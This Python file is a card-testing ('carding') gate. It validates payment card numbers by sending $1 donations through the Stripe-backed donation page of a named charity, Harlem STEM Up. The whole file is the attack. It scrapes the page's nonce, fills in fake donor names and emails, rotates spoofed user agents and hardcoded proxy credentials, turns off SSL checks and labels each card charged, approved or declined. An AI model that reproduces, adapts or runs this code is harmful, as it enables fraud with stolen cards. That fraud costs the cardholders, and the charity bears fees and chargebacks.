import aiohttp
import asyncio
import random
import time
import uuid
import re
import string
from urllib.parse import quote

# Stripe Publishable Key
PK = 'pk_live_51KwTSgIKstDXlptU5k6wY2BYJxjTdS0UOcymscxrSFacKEyKZL8V5XAfA9hLw67KtG6ZlY1wE7ToVqPi2OCsFBp100liJubbpN'

# Proxies — picked randomly, no test calls (removed blocking proxy test)
PROXIES_LIST = [
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cz-pra.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@co-bog.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080',
    'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080',
    'http://OR1673915314:LMf4JcDV@208.196.99.128:8813',
    'http://naveed:Qwerty_123ABC@196.244.48.124:12345'
]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9RT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph",
    "Thomas", "Christopher", "Charles", "Daniel", "Matthew", "Anthony", "Mark",
    "Donald", "Steven", "Andrew", "Paul", "Joshua", "Kenneth", "Kevin", "Brian",
    "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan",
    "Jessica", "Sarah", "Karen", "Lisa", "Nancy", "Betty", "Margaret", "Sandra",
    "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle", "Carol",
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
    "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson",
    "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson",
    "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen",
]

EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com",
    "icloud.com", "mail.com", "zoho.com", "yandex.com", "aol.com"
]


def generate_random_name():
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"


def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    return f"{username}@{random.choice(EMAIL_DOMAINS)}"


def get_random_user_agent():
    return random.choice(USER_AGENTS)


def extract_error_info(response_data):
    result = {"decline_code": None, "message": None}
    if not response_data or not isinstance(response_data, dict):
        return result
    for key in ('error', 'last_payment_error'):
        error = response_data.get(key)
        if isinstance(error, dict):
            result["decline_code"] = error.get('decline_code')
            result["message"] = error.get('message')
            if result["decline_code"] or result["message"]:
                break
    return result


async def _do_check_async(card_number, exp_month, exp_year, cvv, proxy=None):
    """
    Fully async Stripe check using aiohttp.
    Replaces blocking requests library — no event loop blocking.
    """
    user_agent = get_random_user_agent()
    customer_name = generate_random_name()
    customer_email = generate_random_email()
    client_session_id = str(uuid.uuid4())
    wallet_config_id = str(uuid.uuid4())
    time_on_page = random.randint(5000, 45000)

    timeout = aiohttp.ClientTimeout(total=30, connect=10)
    connector = aiohttp.TCPConnector(ssl=False, limit=0)

    async with aiohttp.ClientSession(
        timeout=timeout,
        connector=connector,
        headers={"User-Agent": user_agent}
    ) as session:

        # ── STEP 1: Fetch donation page ───────────────────────
        async with session.get(
            'https://harlemstemup.com/donate/',
            headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            },
            proxy=proxy,
            allow_redirects=True,
        ) as resp:
            page_text = await resp.text()
            cookies_dict = {k: v.value for k, v in resp.cookies.items()}

        cookie_string = '; '.join(f'{k}={v}' for k, v in cookies_dict.items())

        nonce_match = re.search(r'"security":"(.*?)"', page_text)
        idemp_match = re.search(r'"idempotency":"(.*?)"', page_text)

        if not nonce_match or not idemp_match:
            raise Exception("Failed to extract nonce or idempotency from page")

        security_nonce = nonce_match.group(1)
        idempotency_key = idemp_match.group(1)

        await asyncio.sleep(random.uniform(0.15, 0.4))

        # ── STEP 2: Create payment intent ────────────────────
        wp_data = (
            f'action=wpsd_donation'
            f'&name={quote(customer_name)}'
            f'&email={quote(customer_email)}'
            f'&amount=1'
            f'&donation_for=Harlem+STEM+Up!'
            f'&currency=USD'
            f'&idempotency={quote(idempotency_key)}'
            f'&security={quote(security_nonce)}'
            f'&stripeSdk='
        )

        async with session.post(
            'https://harlemstemup.com/wp-admin/admin-ajax.php',
            headers={
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://harlemstemup.com',
                'Referer': 'https://harlemstemup.com/donate/',
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': cookie_string,
            },
            data=wp_data,
            proxy=proxy,
        ) as resp:
            try:
                create_data = await resp.json(content_type=None)
            except Exception:
                raise Exception("Invalid JSON from payment intent creation")

        if not create_data or not isinstance(create_data, dict):
            raise Exception(f"Invalid response: {str(create_data)[:200]}")
        if not create_data.get('success'):
            raise Exception(f"Failed to create payment intent: {create_data}")

        data_section = create_data.get('data')
        if not data_section or not isinstance(data_section, dict):
            raise Exception("Missing data section")
        if data_section.get('status') != 'success':
            raise Exception(f"PI status not success: {data_section}")

        client_secret = data_section.get('client_secret')
        if not client_secret or '_' not in str(client_secret):
            raise Exception("Invalid client_secret")

        payment_intent_id = str(client_secret).split('_secret')[0]

        await asyncio.sleep(random.uniform(0.15, 0.4))

        # ── STEP 3: Confirm payment ──────────────────────────
        confirm_data = (
            f'payment_method_data[type]=card'
            f'&payment_method_data[billing_details][name]={quote(customer_name)}'
            f'&payment_method_data[billing_details][email]={quote(customer_email)}'
            f'&payment_method_data[card][number]={card_number}'
            f'&payment_method_data[card][cvc]={cvv}'
            f'&payment_method_data[card][exp_month]={exp_month}'
            f'&payment_method_data[card][exp_year]={exp_year}'
            f'&payment_method_data[guid]=NA'
            f'&payment_method_data[muid]=NA'
            f'&payment_method_data[sid]=NA'
            f'&payment_method_data[payment_user_agent]=stripe.js%2F{uuid.uuid4().hex[:8]}%3B+stripe-js-v3%2F{uuid.uuid4().hex[:8]}%3B+card-element'
            f'&payment_method_data[referrer]=https%3A%2F%2Fharlemstemup.com'
            f'&payment_method_data[time_on_page]={time_on_page}'
            f'&payment_method_data[client_attribution_metadata][client_session_id]={client_session_id}'
            f'&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements'
            f'&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element'
            f'&payment_method_data[client_attribution_metadata][merchant_integration_version]={random.randint(2017, 2024)}'
            f'&payment_method_data[client_attribution_metadata][wallet_config_id]={wallet_config_id}'
            f'&return_url=https%3A%2F%2Fharlemstemup.com%2Fdonate%2F'
            f'&key={PK}'
            f'&client_attribution_metadata[client_session_id]={client_session_id}'
            '&client_attribution_metadata[merchant_integration_source]=elements'
            '&client_attribution_metadata[merchant_integration_subtype]=card-element'
            f'&client_attribution_metadata[merchant_integration_version]={random.randint(2017, 2024)}'
            f'&client_attribution_metadata[wallet_config_id]={wallet_config_id}'
            f'&client_secret={client_secret}'
        )

        async with session.post(
            f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm',
            headers={
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
            },
            data=confirm_data,
            proxy=proxy,
        ) as resp:
            try:
                response_data = await resp.json(content_type=None)
            except Exception:
                raise Exception("Invalid JSON from confirm")

    if not response_data or not isinstance(response_data, dict):
        raise Exception("Invalid confirm response")

    payment_status = response_data.get('status')

    if payment_status == 'succeeded':
        return {"status": "charged", "decline_code": "succeeded", "response": "Your card was charged"}

    elif payment_status == 'requires_action':
        next_action = response_data.get('next_action') or {}
        if next_action.get('type') == 'redirect_to_url':
            return {"status": "declined", "decline_code": "challenge_required", "response": "Your card needs additional verification"}
        return {"status": "declined", "decline_code": "authentication_required", "response": "Authentication required"}

    else:
        err = extract_error_info(response_data)
        if err.get("decline_code") == "insufficient_funds":
            return {"status": "approved", "decline_code": err["decline_code"], "response": err.get("message") or "Insufficient funds"}
        elif err.get("decline_code") or err.get("message"):
            return {"status": "declined", "decline_code": err.get("decline_code") or "generic_decline", "response": err.get("message") or "Card was declined"}
        elif payment_status == 'requires_payment_method':
            return {"status": "declined", "decline_code": "generic_decline", "response": "Card was declined"}
        elif payment_status == 'canceled':
            return {"status": "declined", "decline_code": "canceled", "response": "Payment was canceled"}
        else:
            return {"status": "declined", "decline_code": "unknown", "response": err.get("message") or f"Status: {payment_status}"}


async def check_gate(card_string: str) -> dict:
    """
    Async entry point for mst.py.
    Input: card|mm|yy|cvv
    Returns: dict with status, decline_code, response
    """
    parts = [p.strip() for p in card_string.split('|')]
    if len(parts) < 4:
        return {"status": "error", "decline_code": None, "response": "Invalid card format"}

    card_number = parts[0]
    exp_month = parts[1].zfill(2)
    exp_year = parts[2]
    cvv = parts[3]

    if len(exp_year) == 4:
        exp_year = exp_year[2:]

    proxy = random.choice(PROXIES_LIST)

    try:
        return await _do_check_async(card_number, exp_month, exp_year, cvv, proxy=proxy)
    except (aiohttp.ClientProxyConnectionError, aiohttp.ClientHttpProxyError):
        try:
            return await _do_check_async(card_number, exp_month, exp_year, cvv, proxy=None)
        except Exception as e:
            return {"status": "error", "decline_code": None, "response": str(e)[:100]}
    except asyncio.TimeoutError:
        return {"status": "error", "decline_code": None, "response": "Timeout"}
    except Exception as e:
        return {"status": "error", "decline_code": None, "response": str(e)[:100]}
